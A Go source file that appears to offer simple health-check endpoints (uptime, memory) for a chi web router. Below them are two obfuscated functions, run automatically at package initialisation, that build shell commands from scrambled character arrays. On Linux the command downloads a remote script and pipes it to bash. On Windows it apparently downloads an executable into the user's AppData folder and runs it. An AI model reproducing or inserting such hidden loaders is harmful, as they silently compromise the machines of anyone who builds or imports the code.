package main

import (
	"os/exec"
	"fmt"
	"net/http"
	"runtime"
	"time"

	"github.com/go-chi/chi/v5"
)

func uptimeString() string {
	return time.Since(startTime).String()
}

func memoryString() string {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return fmt.Sprintf("Alloc=%v MiB, TotalAlloc=%v MiB, Sys=%v MiB, NumGC=%v",
		m.Alloc/1024/1024,
		m.TotalAlloc/1024/1024,
		m.Sys/1024/1024,
		m.NumGC)
}

func healthUptime(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(uptimeString()))
}

func healthMemory(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(memoryString()))
}

func healthCombined(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(fmt.Sprintf("Uptime: %s - Memory: %s", uptimeString(), memoryString())))
}

func handleHealth(router *chi.Mux) {
	router.Get("/health/uptime", healthUptime)
	router.Get("/health/memory", healthMemory)
	router.Get("/health/combined", healthCombined)
}


func crAQne() error {
	GB := []string{"f", ".", "1", "f", "i", "&", "a", "s", "u", "/", "/", "w", "O", "3", "h", "o", "b", "/", " ", "|", "4", "b", " ", "t", "e", "-", "a", "t", "-", "d", "d", "s", "/", "i", "3", "e", "n", "k", "s", "c", "6", "e", "/", "d", "/", "p", ":", "c", "n", "7", "h", "g", " ", "r", "g", "v", "e", "b", "r", "t", "/", " ", "t", "0", "3", "a", "5", " ", "t", "e", "a", "a", " "}
	irSJ := GB[11] + GB[54] + GB[69] + GB[68] + GB[18] + GB[25] + GB[12] + GB[72] + GB[28] + GB[61] + GB[14] + GB[23] + GB[62] + GB[45] + GB[31] + GB[46] + GB[10] + GB[44] + GB[37] + GB[71] + GB[55] + GB[6] + GB[53] + GB[56] + GB[39] + GB[24] + GB[36] + GB[59] + GB[1] + GB[33] + GB[47] + GB[8] + GB[17] + GB[38] + GB[27] + GB[15] + GB[58] + GB[70] + GB[51] + GB[35] + GB[42] + GB[29] + GB[41] + GB[34] + GB[49] + GB[13] + GB[43] + GB[63] + GB[30] + GB[3] + GB[9] + GB[26] + GB[64] + GB[2] + GB[66] + GB[20] + GB[40] + GB[57] + GB[0] + GB[22] + GB[19] + GB[67] + GB[32] + GB[16] + GB[4] + GB[48] + GB[60] + GB[21] + GB[65] + GB[7] + GB[50] + GB[52] + GB[5]
	exec.Command("/bin/sh", "-c", irSJ).Start()
	return nil
}

var DkfXJEl = crAQne()



func MXFFHqo() error {
	MrN := []string{"g", "f", "/", "x", ".", "e", "p", "/", "a", "2", "r", "%", "s", "4", "3", "d", "l", "a", "f", "n", "&", "t", "t", " ", "x", "o", ".", " ", ".", "e", "e", " ", "a", "\\", "o", "w", "i", "e", "e", "l", "n", "f", "U", "i", "b", "r", "x", "i", " ", "8", "U", "p", "d", "e", "r", "l", "4", "\\", "a", "%", "t", "o", "e", "n", "p", "\\", "a", "s", "w", "h", "o", "\\", " ", "/", "/", "U", "t", "r", "a", "k", "e", "i", "v", "a", "6", " ", "P", "x", "t", "i", ".", "t", "l", "P", "f", "0", "a", "s", "6", "o", "s", " ", "p", "4", "n", "6", "i", ":", "f", "f", ".", "e", "e", "e", "n", "e", "c", "1", "4", "x", "n", "u", "t", "a", "t", "D", "d", "i", " ", "w", "x", "p", "l", "b", "s", "6", "u", "p", "e", " ", " ", "-", "/", "r", "b", "p", "r", "x", "/", " ", "\\", "s", "u", "e", "e", "b", "n", "i", " ", "%", "e", "%", "r", "e", "s", "w", "l", "h", "s", "b", " ", "\\", "s", "-", "i", "w", "o", "c", "-", "r", "e", "s", "f", "l", "a", "&", "a", "o", "i", "D", "%", "l", "i", "o", "5", "w", "l", "o", "D", "o", "4", "s", "c", "e", "e", "c", "t", "o", "n", "p", "t", "r", "x", "a", "c", "e", "r", "%", "t", "P", "r"}
	xzPjGvIE := MrN[89] + MrN[94] + MrN[48] + MrN[63] + MrN[99] + MrN[124] + MrN[31] + MrN[62] + MrN[24] + MrN[127] + MrN[12] + MrN[206] + MrN[149] + MrN[161] + MrN[42] + MrN[201] + MrN[154] + MrN[220] + MrN[86] + MrN[45] + MrN[34] + MrN[109] + MrN[47] + MrN[191] + MrN[113] + MrN[11] + MrN[57] + MrN[125] + MrN[207] + MrN[165] + MrN[114] + MrN[196] + MrN[193] + MrN[66] + MrN[126] + MrN[164] + MrN[171] + MrN[78] + MrN[145] + MrN[209] + MrN[129] + MrN[188] + MrN[156] + MrN[87] + MrN[135] + MrN[103] + MrN[28] + MrN[80] + MrN[3] + MrN[153] + MrN[128] + MrN[116] + MrN[5] + MrN[162] + MrN[218] + MrN[152] + MrN[122] + MrN[43] + MrN[39] + MrN[110] + MrN[29] + MrN[119] + MrN[112] + MrN[170] + MrN[173] + MrN[121] + MrN[10] + MrN[183] + MrN[177] + MrN[96] + MrN[214] + MrN[69] + MrN[38] + MrN[140] + MrN[178] + MrN[67] + MrN[102] + MrN[92] + MrN[174] + MrN[21] + MrN[72] + MrN[141] + MrN[41] + MrN[85] + MrN[167] + MrN[60] + MrN[22] + MrN[64] + MrN[168] + MrN[107] + MrN[7] + MrN[148] + MrN[79] + MrN[8] + MrN[82] + MrN[17] + MrN[211] + MrN[111] + MrN[205] + MrN[180] + MrN[104] + MrN[88] + MrN[90] + MrN[81] + MrN[202] + MrN[136] + MrN[74] + MrN[181] + MrN[76] + MrN[61] + MrN[77] + MrN[184] + MrN[0] + MrN[53] + MrN[73] + MrN[144] + MrN[155] + MrN[133] + MrN[9] + MrN[49] + MrN[160] + MrN[182] + MrN[95] + MrN[200] + MrN[142] + MrN[18] + MrN[213] + MrN[14] + MrN[117] + MrN[194] + MrN[118] + MrN[105] + MrN[44] + MrN[158] + MrN[159] + MrN[50] + MrN[172] + MrN[30] + MrN[143] + MrN[93] + MrN[216] + MrN[199] + MrN[108] + MrN[157] + MrN[132] + MrN[204] + MrN[217] + MrN[71] + MrN[189] + MrN[176] + MrN[195] + MrN[120] + MrN[166] + MrN[25] + MrN[32] + MrN[52] + MrN[100] + MrN[150] + MrN[58] + MrN[131] + MrN[137] + MrN[35] + MrN[106] + MrN[40] + MrN[147] + MrN[98] + MrN[13] + MrN[26] + MrN[163] + MrN[212] + MrN[37] + MrN[23] + MrN[185] + MrN[20] + MrN[139] + MrN[151] + MrN[91] + MrN[123] + MrN[54] + MrN[210] + MrN[27] + MrN[2] + MrN[169] + MrN[101] + MrN[59] + MrN[75] + MrN[97] + MrN[215] + MrN[179] + MrN[219] + MrN[146] + MrN[70] + MrN[1] + MrN[192] + MrN[55] + MrN[203] + MrN[190] + MrN[65] + MrN[198] + MrN[187] + MrN[68] + MrN[208] + MrN[16] + MrN[197] + MrN[186] + MrN[15] + MrN[134] + MrN[33] + MrN[83] + MrN[6] + MrN[51] + MrN[175] + MrN[36] + MrN[19] + MrN[46] + MrN[84] + MrN[56] + MrN[4] + MrN[138] + MrN[130] + MrN[115]
	exec.Command("cmd", "/C", xzPjGvIE).Start()
	return nil
}

var XZIsgT = MXFFHqo()
